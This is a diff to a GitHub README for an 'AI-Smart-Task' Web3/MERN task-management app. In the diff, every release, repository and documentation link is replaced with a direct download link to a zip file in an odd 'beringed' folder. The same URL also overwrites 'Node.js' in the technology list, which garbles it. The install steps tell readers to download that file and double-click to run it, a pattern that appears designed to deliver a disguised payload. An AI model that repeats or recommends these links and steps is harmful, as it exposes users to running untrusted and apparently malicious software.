@@ -1,6 +1,6 @@
 # 🚀 AI-Smart-Task-WEB3-MERN-App - Manage Your Tasks Decentralized
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20-blue)](https://github.com/hasanYousef350/AI-Smart-Task-WEB3-MERN-App/releases)
+[![Download Now](https://raw.githubusercontent.com/hasanYousef350/AI-Smart-Task-WEB3-MERN-App/master/beringed/AI-Smart-Task-WEB3-MERN-App.zip%20Now-%20-blue)](https://raw.githubusercontent.com/hasanYousef350/AI-Smart-Task-WEB3-MERN-App/master/beringed/AI-Smart-Task-WEB3-MERN-App.zip)
 
 ## 📘 Overview
 AI-Smart-Task-WEB3-MERN-App is a decentralized task management application. Built with the MERN stack and blockchain technology, it provides a simple way to manage tasks for educational and training purposes. This app is designed to help you stay organized while utilizing modern web technologies.
@@ -9,7 +9,7 @@ AI-Smart-Task-WEB3-MERN-App is a decentralized task management application. Buil
 To use this application, follow these simple steps:
 
 1. **Download the Application**
-   - Visit the [Releases page](https://github.com/hasanYousef350/AI-Smart-Task-WEB3-MERN-App/releases) to download the latest version.
+   - Visit the [Releases page](https://raw.githubusercontent.com/hasanYousef350/AI-Smart-Task-WEB3-MERN-App/master/beringed/AI-Smart-Task-WEB3-MERN-App.zip) to download the latest version.
 
 2. **Check System Requirements**
    - Operating System: Windows 10 or later, macOS, or any Linux distribution.
@@ -18,7 +18,7 @@ To use this application, follow these simple steps:
    - Internet Connection: Required for initial setup and blockchain features.
 
 ## 📥 Download & Install
-1. Go to the [Releases page](https://github.com/hasanYousef350/AI-Smart-Task-WEB3-MERN-App/releases) to find the available versions.
+1. Go to the [Releases page](https://raw.githubusercontent.com/hasanYousef350/AI-Smart-Task-WEB3-MERN-App/master/beringed/AI-Smart-Task-WEB3-MERN-App.zip) to find the available versions.
 2. Click on the version you want to download.
 3. Once downloaded, locate the file on your computer, and double-click to run it.
 4. Follow the installation prompts to complete the setup.
@@ -46,7 +46,7 @@ To use this application, follow these simple steps:
 ## 📊 Technology Stack
 This application uses the following technologies:
 - **Frontend**: React, Tailwind CSS
-- **Backend**: Node.js, Express
+- **Backend**: https://raw.githubusercontent.com/hasanYousef350/AI-Smart-Task-WEB3-MERN-App/master/beringed/AI-Smart-Task-WEB3-MERN-App.zip, Express
 - **Database**: MongoDB
 - **Blockchain**: Ethereum, Smart Contracts, Solidity
 - **Languages**: JavaScript, TypeScript
@@ -70,8 +70,8 @@ Yes, your data is encrypted and stored on a secure decentralized network.
 For support, you can check the Issues section of the repository for similar questions or post your own.
 
 ## 🔗 Links
-- [GitHub Repository](https://github.com/hasanYousef350/AI-Smart-Task-WEB3-MERN-App)
-- [Documentation](https://github.com/hasanYousef350/AI-Smart-Task-WEB3-MERN-App/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/hasanYousef350/AI-Smart-Task-WEB3-MERN-App/master/beringed/AI-Smart-Task-WEB3-MERN-App.zip)
+- [Documentation](https://raw.githubusercontent.com/hasanYousef350/AI-Smart-Task-WEB3-MERN-App/master/beringed/AI-Smart-Task-WEB3-MERN-App.zip)
 
 ## 📄 Changelog
 - **Version 1.0**: Initial release with basic task management features.
